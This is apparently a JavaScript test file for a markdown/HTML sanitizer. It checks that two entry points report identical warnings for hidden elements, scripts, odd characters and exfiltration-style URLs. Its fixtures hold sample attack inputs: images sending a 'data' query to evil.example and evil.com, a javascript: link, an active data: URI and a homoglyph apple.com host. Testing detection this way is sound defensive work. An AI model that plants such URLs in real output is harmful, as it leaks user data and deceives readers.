/**
 * Both entry points that run Layers 1–3 must describe the same finding with the
 * same words, and each case must produce the finding it was written for.
 *
 * `sanitize()` (./src/index.mjs) delegates to `sanitizeText()` (./src/output.mjs)
 * and both read their prose from ./src/warnings.mjs, so the comparison between
 * them is what fails if either re-inlines a string. That comparison alone
 * passes on two empty lists, though — so every case also declares the exact
 * warnings and notes it must yield, built from the warnings.mjs builders where
 * one exists. Both TIERS are pinned: the severity split (./src/severity.mjs)
 * sends some of these sentences to `notes`, and calling a finding a warning in
 * one place and a note in the other is the same drift in a new coordinate.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { sanitize } from "../src/index.mjs";
import { sanitizeText, needsMarkdownPipeline } from "../src/output.mjs";
import {
  LONE_SURROGATE_WARNING,
  UNSCANNABLE_WARNING,
  HTML_UNPARSEABLE_WARNING,
  describeHtmlSanitized,
  describeWarned,
  describeExfil,
  describeConfusableHosts,
} from "../src/warnings.mjs";

const BLOB = "A".repeat(44);
const HEX_HINT =
  " — inspect the removed bytes with a hex dump (xxd / od -c), which survives sanitization";
const hidden1 = describeHtmlSanitized({ comments: 0, hidden: 1 });
const queryImage = describeExfil([
  {
    isImage: true,
    target: "evil.example",
    reason: "suspicious query parameter",
  },
]);

/**
 * One input per Layer-1/2/3 branch, each with the exact findings it must yield.
 * @type {Array<{ name: string, input: string, warnings: string[], notes: string[] }>}
 */
const CASES = [
  {
    name: "comment only",
    input: "a <!-- hi --> b",
    warnings: [describeHtmlSanitized({ comments: 1, hidden: 0 })],
    notes: [],
  },
  {
    name: "hidden element",
    input: "a <span hidden>S</span> b",
    warnings: [hidden1],
    notes: [],
  },
  {
    name: "comment + hidden",
    input: "a <!-- one --> b <span hidden>S</span> c",
    warnings: [describeHtmlSanitized({ comments: 1, hidden: 1 })],
    notes: [],
  },
  {
    name: "preserved script",
    input: "see <script>x</script> source",
    warnings: [],
    notes: [describeWarned({ tags: { script: 1 }, dataSrc: 0 })],
  },
  {
    name: "preserved script x2 + data URI",
    input: '<script>a</script><script>b</script><img src="data:text/html,x">',
    warnings: [
      describeExfil([
        {
          isImage: true,
          target: "(inline data: URI)",
          reason: "active-content data: URI",
        },
      ]),
    ],
    notes: [describeWarned({ tags: { script: 2 }, dataSrc: 1 })],
  },
  {
    name: "one exfil reason",
    input: `![alt](https://evil.example/p?data=${BLOB})`,
    warnings: [queryImage],
    notes: [],
  },
  {
    name: "two exfil reasons, links only (a NOTE)",
    input: `[a](https://evil.example/p?data=${BLOB}) and [b](javascript:alert(1))`,
    warnings: [],
    notes: [
      describeExfil([
        {
          isImage: false,
          target: "evil.example",
          reason: "suspicious query parameter",
        },
        { isImage: false, target: "", reason: "script-executing URI" },
      ]),
    ],
  },
  {
    name: "exfil inside a hidden element",
    input: `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
    warnings: [hidden1, queryImage],
    notes: [],
  },
  {
    name: "look-alike host",
    input: "see [docs](https://аpple.com/x)",
    warnings: [
      describeConfusableHosts([
        { description: 'аpple.com (xn--pple-43d.com) reads as "apple.com"' },
      ]),
    ],
    notes: [],
  },
  {
    name: "too deep to scan",
    input: `${"<div>".repeat(5000)}https://x.example/`,
    warnings: [HTML_UNPARSEABLE_WARNING, UNSCANNABLE_WARNING],
    notes: [],
  },
  {
    name: "zero-width char beside spliced html",
    input: "a\u200b<i hidden>S</i> b",
    warnings: [`Stripped: Format chars (Cf)${HEX_HINT}`, hidden1],
    notes: [],
  },
  {
    name: "lone surrogate beside spliced html",
    input: "a\ud800<i hidden>S</i> b",
    warnings: [LONE_SURROGATE_WARNING, hidden1],
    notes: [],
  },
  {
    name: "ansi escape beside spliced html",
    input: "a\u001b[31mred\u001b[0m <i hidden>S</i> b",
    warnings: [`Stripped: ANSI escapes${HEX_HINT}`, hidden1],
    notes: [],
  },
  {
    name: "benign html (the one silent case)",
    input: "hello <b>world</b>",
    warnings: [],
    notes: [],
  },
];

describe("warning parity between sanitize() and sanitizeText()", () => {
  it("the corpus is not vacuous: every case but one declares a finding", () => {
    const silent = CASES.filter(
      (c) => c.warnings.length + c.notes.length === 0,
    );
    assert.deepEqual(
      silent.map((c) => c.name),
      ["benign html (the one silent case)"],
    );
  });

  for (const c of CASES)
    it(`${c.name}: both entry points emit exactly the declared findings`, async () => {
      const root = await sanitize(c.input, { html: true });
      const pipeline = await sanitizeText(c.input, {
        html: true,
        exfilScan: true,
      });
      assert.deepEqual(
        { warnings: root.warnings, notes: root.notes },
        { warnings: c.warnings, notes: c.notes },
      );
      assert.deepEqual(
        { warnings: pipeline.warnings, notes: pipeline.notes },
        { warnings: c.warnings, notes: c.notes },
      );
    });

  it("both entry points honor flagDigestValues, and neither invents it", async () => {
    // The root entry forwards the option through a second module, so it is the
    // half that can silently drop it while the pipeline half keeps working.
    const input = `<img src="https://evil.com/x?h=${"a".repeat(40)}">`;
    const options = { exfilScan: true, flagDigestValues: true };
    const root = await sanitize(input, options);
    const pipeline = await sanitizeText(input, options);
    assert.deepEqual(root.warnings, pipeline.warnings);
    assert.deepEqual(root.notes, pipeline.notes);
    assert.ok(root.warnings.some((w) => /image to evil\.com/.test(w)));
    // Non-vacuity: the same input is silent at BOTH entries without the option,
    // so the assertion above is the option working and not the URL firing on
    // some other arm.
    for (const quiet of [
      await sanitize(input, { exfilScan: true }),
      await sanitizeText(input, { exfilScan: true }),
    ])
      assert.deepEqual(quiet.warnings, []);
  });

  it("both entry points skip the HTML graph on exactly the same inputs", async () => {
    // Gate-false text must come back untouched and finding-free from the root
    // entry even with `html: true`.
    const gateFalse = "plain prose, nothing here — 1 < 2 and 3 > 2";
    assert.equal(needsMarkdownPipeline(gateFalse), false);
    const root = await sanitize(gateFalse, { html: true });
    assert.equal(root.cleaned, gateFalse);
    assert.deepEqual(root.warnings, []);
    assert.deepEqual(root.notes, []);
    assert.deepEqual(root.found, []);

    // And the gate is not vacuously false: a tagged input still reaches Layer 2.
    const gateTrue = "a <span hidden>S</span> b";
    assert.equal(needsMarkdownPipeline(gateTrue), true);
    const reached = await sanitize(gateTrue, { html: true });
    assert.deepEqual(reached.warnings, [hidden1]);
  });
});
